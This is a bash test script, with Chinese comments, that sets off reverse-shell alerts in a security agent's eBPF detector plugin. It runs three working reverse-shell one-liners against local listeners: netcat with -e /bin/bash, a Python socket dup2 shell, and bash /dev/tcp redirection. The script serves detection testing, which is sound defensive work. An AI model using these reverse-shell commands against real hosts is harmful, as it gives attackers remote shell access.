#!/bin/bash
#
# 反弹 Shell 检测测试脚本
# 用于触发 ebpf_base_detector 插件的反弹 Shell 告警（DataType 6004）
#
# 使用前请先在另一个终端启动 Agent：
#   cd /opt/cloudsec
#   sudo ./bin/agent -standalone -plugins=ebpf_base_detector -output=/opt/cloudsec/logs/agent.log -test
#
# 然后在当前终端执行本脚本：
#   sudo bash scripts/test-reverse-shell.sh
#
# 依赖：netcat-traditional、python3
#   sudo apt install netcat-traditional python3
#

set -e

INTERVAL=3  # 每个测试用例之间的等待秒数

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ------------------------------------------
# 前置检查
# ------------------------------------------
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}错误：本脚本需要 root 权限运行${NC}"
    echo "  用法: sudo bash $0"
    exit 1
fi

if ! command -v nc.traditional &>/dev/null; then
    echo -e "${RED}错误：未找到 nc.traditional，请先安装: sudo apt install netcat-traditional${NC}"
    exit 1
fi

if ! command -v python3 &>/dev/null; then
    echo -e "${RED}错误：未找到 python3${NC}"
    exit 1
fi

# 清理函数：确保后台监听进程被清理
cleanup() {
    for pid in "${LISTEN_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
    done
}
trap cleanup EXIT

LISTEN_PIDS=()

echo "========================================"
echo " 反弹 Shell 检测 — 自动化测试"
echo "========================================"
echo ""
echo "请确认 Agent 已在另一个终端启动"
echo ""

# ------------------------------------------
# RS001: nc -e 反弹
# 预期: Reverse shell detected  comm=bash  fd_type=3  remote_port=9001
# ------------------------------------------
echo -e "${YELLOW}[1/3] RS001: nc -e 反弹${NC}"
echo "  启动监听: nc -lvp 9001"
nc -lvp 9001 &>/dev/null &
LISTEN_PIDS+=($!)
sleep 1

echo "  触发反弹: nc.traditional -e /bin/bash 127.0.0.1 9001"
nc.traditional -e /bin/bash 127.0.0.1 9001 &
RS_PID=$!
sleep 2
kill $RS_PID 2>/dev/null || true
wait $RS_PID 2>/dev/null || true
kill "${LISTEN_PIDS[-1]}" 2>/dev/null || true
wait "${LISTEN_PIDS[-1]}" 2>/dev/null || true
echo -e "${GREEN}  完成${NC}"
sleep "$INTERVAL"

# ------------------------------------------
# RS002: Python dup2 反弹
# 预期: Reverse shell detected  comm=bash  fd_type=3  remote_port=9002
# ------------------------------------------
echo -e "${YELLOW}[2/3] RS002: Python dup2 反弹${NC}"
echo "  启动监听: nc -lvp 9002"
nc -lvp 9002 &>/dev/null &
LISTEN_PIDS+=($!)
sleep 1

echo "  触发反弹: python3 dup2 + subprocess.call(['/bin/bash','-i'])"
timeout 3 python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
' &>/dev/null || true
kill "${LISTEN_PIDS[-1]}" 2>/dev/null || true
wait "${LISTEN_PIDS[-1]}" 2>/dev/null || true
echo -e "${GREEN}  完成${NC}"
sleep "$INTERVAL"

# ------------------------------------------
# RS003: bash /dev/tcp 反弹
# 预期: Reverse shell detected  comm=bash  fd_type=3  remote_port=9003
# ------------------------------------------
echo -e "${YELLOW}[3/3] RS003: bash /dev/tcp 反弹${NC}"
echo "  启动监听: nc -lvp 9003"
nc -lvp 9003 &>/dev/null &
LISTEN_PIDS+=($!)
sleep 1

echo "  触发反弹: bash -c 'bash -i >& /dev/tcp/127.0.0.1/9003 0>&1'"
timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9003 0>&1' &>/dev/null || true
kill "${LISTEN_PIDS[-1]}" 2>/dev/null || true
wait "${LISTEN_PIDS[-1]}" 2>/dev/null || true
echo -e "${GREEN}  完成${NC}"

# ------------------------------------------
# 汇总
# ------------------------------------------
echo ""
echo "========================================"
echo " 测试完成"
echo "========================================"
echo ""
echo "请在 Agent 终端确认以下告警："
echo ""
echo -e "  ${RED}[1] RS001: Reverse shell detected  comm=bash  fd_type=3  remote_port=9001${NC}"
echo -e "  ${RED}[2] RS002: Reverse shell detected  comm=bash  fd_type=3  remote_port=9002${NC}"
echo -e "  ${RED}[3] RS003: Reverse shell detected  comm=bash  fd_type=3  remote_port=9003${NC}"
